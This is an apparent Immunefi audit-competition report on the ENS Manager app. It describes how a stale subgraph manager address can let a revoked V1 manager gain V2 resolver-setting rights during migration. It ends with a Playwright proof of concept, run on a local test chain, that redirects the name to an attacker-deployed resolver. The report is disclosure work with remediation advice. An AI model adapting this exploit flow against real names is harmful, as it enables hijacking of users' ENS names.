# 92964 w a medium manager migration can restore a revoked v1 manager s permission to change the resolver

**Submitted on Sep 13th 2026 at 14:20:09 UTC by @AvidApex for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92964
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

The Manager app can restore a revoked manager’s authority when an owner migrates an unwrapped V1 `.eth` name to V2. It selects the manager from subgraph data, verifies the registration owner, and grants the selected account permission to change the V2 resolver without checking whether it remains the current V1 manager.

## Vulnerability Details

A V1 name’s registrant and manager can be different accounts. The BaseRegistrar identifies the registrant the V1 Registry identifies the manager. Revoking the manager does not have to change the registrant.

### 1. The manager comes from subgraph data

For unwrapped names, classification copies `domain.owner.id` into `managerAddress` when it differs from the registrant \[1]:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

This is the indexed manager address, not a fresh Registry read. If the selected data predates revocation, it can still identify the former manager.

### 2. The ownership check validates a different role

For unwrapped names, `checkOwnership` checks the registration owner through the BaseRegistrar \[2]:

```ts
address: BASE_REGISTRAR,
abi: BASE_REGISTRAR_ABI,
functionName: 'ownerOf' as const,
args: [BigInt(name.domain.labelhash)] as const,
```

The registrant can pass this check after revoking a separate manager. The eligibility checks do not read V1 `ENSRegistry.owner(node)` to validate or refresh `managerAddress` \[3].

The later forced preflight and batch reconstruction also preserve the selected manager without checking its current V1 authority \[4, 5].

### 3. The selected address receives a new V2 permission

The migration batch adds a restoration call for a non-null `managerAddress` \[6]. The role builder uses that address directly \[7]:

```ts
abi: ETH_REGISTRY_V2_ABI,
functionName: 'grantRoles',
args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
```

`ROLE_SET_RESOLVER` lets the recipient replace the name’s resolver. The success verifier checks that this same planned address received the role, so a grant to the former manager satisfies that check \[8].

## Preconditions and User Interaction

* The name is an eligible, unwrapped V1 `.eth` name, and the migrating user remains its registrant.
* A different account previously held legitimate manager access and has since been revoked.
* The migration plan still contains that former manager’s address.
* Migration is enabled, the normal checks pass, and the owner approves the workflow.

The app describes the approval as “Restore the existing managers for your names,” without identifying the receiving address in that explanation \[9].

## Impact

A revoked manager can regain permission to replace the migrated name’s resolver. The registration can remain with its owner while the former manager controls which resolver the name uses.

## Recommended Remediation

Determine the manager to restore from a current V1 `ENSRegistry.owner(node)` read and revalidate it before requesting the signature that grants the role. If the address changes, invalidate the plan and require a new confirmation. Block restoration if the authoritative read fails.

Show the exact address and permission in the confirmation. Retain the separate registrant check. Regression coverage should include a valid manager, revocation, changes while a plan is pending and failed Registry reads.

## References

\[1] classifyNames.ts — manager selected from the subgraph (line 162) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L162>

\[2] preflightChecks.ts — registration ownership check (line 57) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/preflightChecks.ts#L57>

\[3] preflightChecks.ts — combined eligibility checks (line 209) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/preflightChecks.ts#L209>

\[4] useMigrationGasEstimate.ts — forced preflight (line 97) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L97>

\[5] migrationService.ts — batch reconstruction (line 886) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L886>

\[6] buildAtomicMigrationBatches.ts — manager-restoration call (line 608) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608>

\[7] buildRoleGrantCalls.ts — recipient of the role grant (line 21) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L21>

\[8] verifyAtomicMigrationBatch.ts — expected role recipient (line 337) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts#L337>

\[9] WalletConfirmationStepsDialog.tsx — manager-restoration explanation (line 81) <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81>

## Proof of Concept

## Proof of Concept

```ts
/**
 * Run after starting E2E infra and Manager with:
 * VITE_PUBLIC_POSTHOG_HOST=http://127.0.0.1:3999 pnpm --filter manager dev --mode ci
 */
import { createServer, type Server } from 'node:http'
import {
  type Web3ProviderBackend,
  Web3RequestKind,
} from '@ensdomains/headless-web3-provider'
import type { Page } from '@playwright/test'
import {
  type Address,
  encodeFunctionData,
  type Hex,
  keccak256,
  namehash,
  parseAbi,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  reserveInV2,
  V1_BASE_REGISTRAR,
  V1_ENS_REGISTRY,
  V2_ETH_REGISTRY,
} from '../../../fixtures/makeV1Name.js'
import { expect, test } from '../../../fixtures/playwright.manager.fixture.js'
import {
  publicClient,
  testClient,
  walletClient,
} from '../../../helpers/anvil-client.js'
import { buildV1Domain } from '../../../helpers/mock-v1-subgraph.js'

const HCA = '0x48B9c6898baFc8A3D3a495BF7c44CF3351486628' as Address
const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
const SUBGRAPH = '**/v1-graphql.ens.dev/subgraph'
const ROLE_SET_RESOLVER = 1n << 24n
const BALANCE = 10_000n * 10n ** 18n
const registrarAbi = parseAbi([
  'function owner() view returns (address)',
  'function addController(address)',
  'function register(uint256,address,uint256) returns (uint256)',
  'function reclaim(uint256,address)',
  'function nameExpires(uint256) view returns (uint256)',
])
const registryV1Abi = parseAbi([
  'function owner(bytes32) view returns (address)',
])
const registryV2Abi = parseAbi([
  'function hasRoles(uint256,uint256,address) view returns (bool)',
  'function setResolver(uint256,address)',
  'function getResolver(string) view returns (address)',
])
const resolverAbi = parseAbi(['function addr(bytes32) view returns (address)'])
type Account = ReturnType<typeof privateKeyToAccount>

async function mined(hash: Hex) {
  expect((await publicClient.waitForTransactionReceipt({ hash })).status).toBe(
    'success',
  )
}

async function reclaim(account: Account, id: bigint, manager: Address) {
  await mined(
    await walletClient.sendTransaction({
      account,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: registrarAbi,
        functionName: 'reclaim',
        args: [id, manager],
      }),
    }),
  )
}

async function makeEligibleName(registrant: Account) {
  const label = `stale-manager-poc-${Math.floor(Date.now() / 1000)}`
  const id = BigInt(keccak256(toHex(label)))
  const registrarOwner = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: registrarAbi,
    functionName: 'owner',
  })

  await testClient.setBalance({ address: registrarOwner, value: BALANCE })
  await testClient.impersonateAccount({ address: registrarOwner })
  try {
    await mined(
      await walletClient.sendTransaction({
        account: registrarOwner,
        to: V1_BASE_REGISTRAR,
        data: encodeFunctionData({
          abi: registrarAbi,
          functionName: 'addController',
          args: [registrant.address],
        }),
      }),
    )
  } finally {
    await testClient.stopImpersonatingAccount({ address: registrarOwner })
  }

  await mined(
    await walletClient.sendTransaction({
      account: registrant,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: registrarAbi,
        functionName: 'register',
        args: [id, registrant.address, 365n * 24n * 60n * 60n],
      }),
    }),
  )
  await reclaim(registrant, id, registrant.address)
  const expiry = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: registrarAbi,
    functionName: 'nameExpires',
    args: [id],
  })
  await reserveInV2(label, expiry)
  return { expiry, id, label, name: `${label}.eth` }
}

async function migrate(page: Page, wallet: Web3ProviderBackend) {
  await page.route('**/wallet/fund', (route) =>
    route.fulfill({ status: 200, contentType: 'application/json', body: '{}' }),
  )
  const openMigration = page
    .getByRole('button', { name: 'Upgrade Names' })
    .first()
  await expect(openMigration).toBeEnabled({ timeout: 90_000 })
  console.log('[poc] migration navigation enabled')
  await openMigration.click()
  await page
    .getByRole('heading', { name: 'Your names are ready to upgrade' })
    .waitFor()
  console.log('[poc] migration page loaded')
  const button = page.getByRole('button', { name: /Upgrade 1 name/i })
  await expect(button).toBeEnabled({ timeout: 90_000 })
  console.log('[poc] migration confirmation enabled')

  let done = false
  const success = page
    .getByRole('dialog', { name: 'Your name has been upgraded!' })
    .waitFor({ state: 'visible', timeout: 120_000 })
    .finally(() => {
      done = true
    })
  await button.click()
  console.log('[poc] migration submitted')
  while (!done) {
    const pending = wallet.getPendingRequestCount(
      Web3RequestKind.SendTransaction,
    )
    await Promise.race([
      pending
        ? wallet.authorize(Web3RequestKind.SendTransaction)
        : page.waitForTimeout(250),
      success,
    ])
  }
  await success
  console.log('[poc] migration success dialog visible')
}

function attackerResolver(address: Address): Hex {
  const word = address.slice(2).padStart(64, '0')
  return `0x6029600c60003960296000f37f${word}60005260206000f3`
}

let flagServer: Server
test.beforeAll(async () => {
  flagServer = createServer((_request, response) => {
    response.writeHead(200, {
      'access-control-allow-origin': '*',
      'content-type': 'application/json',
    })
    response.end(
      JSON.stringify({
        featureFlags: { migration: true, 'migration-nft': false },
        featureFlagPayloads: {},
        errorsWhileComputingFlags: false,
      }),
    )
  })
  await new Promise<void>((resolve) =>
    flagServer.listen(3999, '127.0.0.1', resolve),
  )
})
test.afterAll(() => {
  return new Promise<void>((resolve, reject) => {
    flagServer.close((error) => (error ? reject(error) : resolve()))
    flagServer.closeAllConnections()
  })
})

test('revoked V1 manager regains V2 resolver control', async ({
  migrationConnectedPage: page,
  wallet,
  accounts,
}) => {
  const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
  const attacker = privateKeyToAccount(accounts.getPrivateKey('user2'))
  await Promise.all(
    [owner.address, attacker.address, HCA].map((address) =>
      testClient.setBalance({ address, value: BALANCE }),
    ),
  )

  const name = await makeEligibleName(owner)
  const node = namehash(name.name)
  console.log('[poc] eligible name created')

  // Prime Manager's five-minute cache while the attacker is still manager.
  await reclaim(owner, name.id, attacker.address)
  console.log('[poc] former manager cached state prepared')
  let indexedManager = attacker.address
  let nameFetches = 0
  let postRevocationResponses = 0
  let revoked = false
  await page.route(SUBGRAPH, async (route, request) => {
    const isNamesQuery = request.postData()?.includes('getNamesForAddress')
    if (isNamesQuery) {
      nameFetches += 1
      if (revoked) {
        postRevocationResponses += 1
        expect(indexedManager).toBe(owner.address)
      }
    }
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({
        data: {
          domains: isNamesQuery
            ? [
                buildV1Domain({
                  label: name.label,
                  ownerAddress: owner.address,
                  managerAddress: indexedManager,
                  expiryDate: Number(name.expiry),
                }),
              ]
            : [],
        },
      }),
    })
  })
  const firstNamesResponse = page.waitForResponse(
    (response) =>
      response.url().includes('v1-graphql.ens.dev/subgraph') &&
      Boolean(response.request().postData()?.includes('getNamesForAddress')),
  )
  await page.goto(`${MANAGER_APP_URL}/dashboard`, {
    waitUntil: 'domcontentloaded',
  })
  await firstNamesResponse
  console.log('[poc] initial names response received', { nameFetches })
  await expect(
    page.getByRole('button', { name: 'Upgrade Names' }).first(),
  ).toBeEnabled({ timeout: 90_000 })
  console.log('[poc] dashboard ready')

  // Revoke on-chain and make every future subgraph response authoritative.
  const fetchesBeforeRevocation = nameFetches
  await reclaim(owner, name.id, owner.address)
  indexedManager = owner.address
  revoked = true
  console.log('[poc] former manager revoked on-chain')
  expect(
    await publicClient.readContract({
      address: V1_ENS_REGISTRY,
      abi: registryV1Abi,
      functionName: 'owner',
      args: [node],
    }),
  ).toBe(owner.address)

  const hasRole = () =>
    publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: registryV2Abi,
      functionName: 'hasRoles',
      args: [name.id, ROLE_SET_RESOLVER, attacker.address],
    })
  const roleBefore = await hasRole()
  expect(roleBefore).toBe(false)
  console.log('[poc] starting SPA migration', { fetchesBeforeRevocation })
  await migrate(page, wallet)
  const roleAfter = await hasRole()
  console.log('[poc] migration complete', {
    nameFetches,
    postRevocationResponses,
    roleAfter,
  })
  expect(postRevocationResponses).toBeGreaterThan(0)
  expect(roleAfter).toBe(true)

  const deployment = await publicClient.waitForTransactionReceipt({
    hash: await walletClient.sendTransaction({
      account: attacker,
      data: attackerResolver(attacker.address),
    }),
  })
  const resolver = deployment.contractAddress as Address
  const redirectHash = await walletClient.sendTransaction({
    account: attacker,
    to: V2_ETH_REGISTRY,
    data: encodeFunctionData({
      abi: registryV2Abi,
      functionName: 'setResolver',
      args: [name.id, resolver],
    }),
  })
  await mined(redirectHash)

  expect(
    (
      await publicClient.readContract({
        address: V2_ETH_REGISTRY,
        abi: registryV2Abi,
        functionName: 'getResolver',
        args: [name.label],
      })
    ).toLowerCase(),
  ).toBe(resolver.toLowerCase())
  expect(
    (
      await publicClient.readContract({
        address: resolver,
        abi: resolverAbi,
        functionName: 'addr',
        args: [node],
      })
    ).toLowerCase(),
  ).toBe(attacker.address.toLowerCase())

  console.log({
    name: name.name,
    nameFetchesBeforeRevocation: fetchesBeforeRevocation,
    nameFetchesAfterMigration: nameFetches,
    postRevocationResponses,
    roleBefore,
    roleAfter,
    attackerResolver: resolver,
    resolvedAddress: attacker.address,
    redirectTransaction: redirectHash,
  })
})
```
